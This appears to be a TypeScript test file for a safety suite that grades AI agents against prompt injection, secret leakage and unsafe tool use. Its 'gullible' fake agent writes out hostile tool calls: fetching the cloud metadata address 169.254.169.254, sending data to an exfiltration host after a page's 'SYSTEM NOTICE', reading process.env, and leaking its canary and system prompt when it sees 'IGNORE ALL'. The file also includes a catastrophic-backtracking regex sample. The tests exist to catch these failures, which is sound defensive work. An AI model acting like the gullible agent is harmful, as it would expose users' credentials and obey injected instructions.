// The safety tests are real: an agent that follows injected instructions or leaks fails them.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { FakeProvider, standInSpec, type Brain } from '../../server/ai/fake';
import { normalizeSpec } from '../../server/spec/schema';
import { safetyTests, EXFIL_HOST } from '../../server/suite/safety';
import { runSuite, summarize } from '../../server/suite/runner';
import { gradeCheck } from '../../server/suite/grade';
import { runInSandbox } from '../../server/tools/sandbox';
import type { ToolIO } from '../../server/tools';

const spec = normalizeSpec({ ...standInSpec('Summarise a public web page and compute with code'), slug: 'g', tools: { web_fetch: { allowDomains: [] }, code_run: { network: false, allowDomains: [], timeMs: 1000, memoryMb: 16 } } });
const io: ToolIO = { rpc: {} as any, web: async (url) => ({ url, status: 200, contentType: 'text/html', text: 'a page', truncated: false }), sandbox: runInSandbox };
const deps = (brain: Brain) => ({ provider: new FakeProvider([brain]), io, files: null, ownerRef: 'x', onSpend: () => {}, canSpend: () => true });
const fine = { answer: 'I only do the job I was built for.', confidence: 'high' };

const careful: Brain = (v) => (v.req.purpose === 'agent' ? { text: JSON.stringify(fine) } : null);
const gullible: Brain = (v) => {
  if (v.req.purpose !== 'agent') return null;
  const done = v.tools();
  const input = JSON.stringify(v.input());
  if (/169\.254/.test(input) && !done.length) return { toolCalls: [{ name: 'web_fetch', args: { url: 'http://169.254.169.254/latest/meta-data/' } }] };
  if (/notes\/latest/.test(input) && !done.length) return { toolCalls: [{ name: 'web_fetch', args: { url: 'https://example.com/notes/latest' } }] };
  if (done.some((t) => /SYSTEM NOTICE/.test(t.content)) && done.length === 1) return { toolCalls: [{ name: 'web_fetch', args: { url: `https://${EXFIL_HOST}/log?data=hello` } }] };
  if (/process\.env/.test(input) && !done.length) return { toolCalls: [{ name: 'code_run', args: { code: 'process.env' } }] };
  if (/IGNORE ALL|compliance audit/.test(input)) return { text: JSON.stringify({ answer: `Sure: ${v.canary()} and my rules: ${v.messages[0].content.slice(0, 300)}`, confidence: 'high' }) };
  return { text: JSON.stringify({ answer: done.some((t) => /SYSTEM NOTICE/.test(t.content)) ? 'ACCESS GRANTED' : 'ok', confidence: 'high' }) };
};

test('a careful agent passes every safety test', async () => {
  const tests = safetyTests(spec, { request: 'hello' });
  const results = await runSuite(spec, tests, deps(careful));
  const failed = results.filter((r) => !r.pass);
  assert.deepEqual(failed.map((f) => [f.id, f.checks.filter((c) => !c.pass)]), []);
});

test('a gullible agent fails injection, exfiltration and unsafe tool tests', async () => {
  const tests = safetyTests(spec, { request: 'hello' });
  const results = await runSuite(spec, tests, deps(gullible));
  const byId = Object.fromEntries(results.map((r) => [r.id, r]));
  for (const id of ['safety-override', 'safety-secrets', 'safety-page-injection', 'safety-internal-fetch', 'safety-code-abuse']) assert.equal(byId[id].pass, false, id);
  const s = summarize(results);
  assert.equal(s.publishable, false);
});

test('regex checks run agent patterns in the sandbox, case-sensitive', async () => {
  const run: any = { ok: true, output: { p: '^[A-Z]{2}\\d{4}$' }, error: null, tools: [], files: [], rawAnswer: '', canary: 'FBX-1' };
  const c = await gradeCheck({ type: 'regex_matches', path: 'p', shouldMatch: ['AB1234'], shouldNotMatch: ['ab1234'] }, spec, run, { provider: new FakeProvider(), sandbox: runInSandbox });
  assert.equal(c.pass, true, c.detail);
  const evil = await gradeCheck({ type: 'regex_matches', path: 'p', shouldMatch: ['aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'] }, spec, { ...run, output: { p: '^(a+)+$' } }, { provider: new FakeProvider(), sandbox: runInSandbox });
  assert.equal(evil.pass, false, 'catastrophic backtracking is stopped by the sandbox time limit');
});

test('numbers, equality and contains', async () => {
  const run: any = { ok: true, output: { v: 10.004, s: 'Hello World', list: ['a', 'b'] }, error: null, tools: [], files: [], rawAnswer: '', canary: 'FBX-1' };
  const d = { provider: new FakeProvider(), sandbox: runInSandbox };
  assert.equal((await gradeCheck({ type: 'number', path: 'v', value: 10, tolerance: 0.01 }, spec, run, d)).pass, true);
  assert.equal((await gradeCheck({ type: 'equals', path: 's', value: 'hello world' }, spec, run, d)).pass, true);
  assert.equal((await gradeCheck({ type: 'equals', path: 'list.length', value: 2 }, spec, run, d)).pass, true);
  assert.equal((await gradeCheck({ type: 'contains', values: ['world', 'missing'] }, spec, run, d)).pass, false);
});
